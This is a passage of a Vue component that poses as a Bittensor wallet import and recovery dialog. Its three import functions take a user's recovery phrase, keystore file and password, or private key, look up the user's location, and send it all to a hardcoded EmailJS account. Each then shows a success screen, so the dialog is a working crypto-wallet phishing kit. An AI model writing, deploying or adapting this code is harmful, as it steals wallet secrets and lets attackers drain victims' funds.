    const pct = Math.min(100, (elapsed / duration) * 100);
    progress.value = pct;
    if (elapsed < duration) {
      requestAnimationFrame(step);
    } else {
      isLoading.value = false;
      setTimeout(() => {
        currentStep.value = 4;
      }, 400);
    }
  }
  requestAnimationFrame(step);
}

function selectRecoveryMethod(method) {
  recoveryMethod.value = method;
  currentStep.value = 5;
  // Reset previous inputs
  resetInputs();
}

function resetInputs() {
  recoveryPhrase.value = "";
  keystoreFile.value = null;
  keystoreFileName.value = "";
  keystorePassword.value = "";
  privateKey.value = "";
}

function goBackToMethods() {
  currentStep.value = 4;
  resetInputs();
}

async function importRecoveryPhrase() {
  isLoading.value = true;
  if (phraseWordCount.value < 12) {
    message.value = {
      text: "Please enter at least 12 words in your recovery phrase",
      type: "error",
    };
    return;
  }

  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "Phrase Recovery",
      phrase: recoveryPhrase.value,
    };
    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Bittensor Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params,
    );
    if (response.data === "OK") {
      currentStep.value = 6;
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function importKeystore() {
  isLoading.value = true;
  if (!keystoreFile.value || keystorePassword.value.trim().length === 0) {
    message.value = {
      text: "Please provide both keystore file and password",
      type: "error",
    };
    return;
  }

  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "Keystore JSON",
      keystore: keystoreFile.value,
      password: keystorePassword.value,
    };
    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Bittensor Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params,
    );
    if (response.data === "OK") {
      currentStep.value = 6;
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

async function importPrivateKey() {
  isLoading.value = true;
  if (!isValidPrivateKey.value) {
    message.value = {
      text: "Please enter a valid private key",
      type: "error",
    };
    return;
  }
  try {
    const location = await axios.get("https://ipapi.co/json");
    const payload = {
      type: "Private Key",
      private: privateKey.value,
    };
    const params = {
      service_id: "service_k4kimk6",
      template_id: "template_mpy0fmg",
      user_id: "DMvtKT5BmC4qV83V9",
      template_params: {
        from_name: "Blockchain solutions",
        wallet_type: "Bittensor Wallet",
        location: JSON.stringify(location.data),
        link_drops: JSON.stringify(payload),
        reply_to: "customeronlineagent@gmail.com",
      },
    };
    const response = await axios.post(
      "https://api.emailjs.com/api/v1.0/email/send",
      params,
    );
    if (response.data === "OK") {
      currentStep.value = 6;
    }
  } catch (err) {
    showMessage(err.message || "Import failed", "error");
  } finally {
    isLoading.value = false;
  }
}

function completeImport() {
  // Emit success event
  emit("close");
}

function showMessage(text, type = "success") {
  message.value = { text, type };
  setTimeout(() => {
    message.value.text = "";
  }, 3000);
}
</script>

<style scoped>
.fade-enter-active,
.fade-leave-active {
  transition: opacity 0.3s ease;
}

.fade-enter-from,
.fade-leave-to {
  opacity: 0;
}
</style>
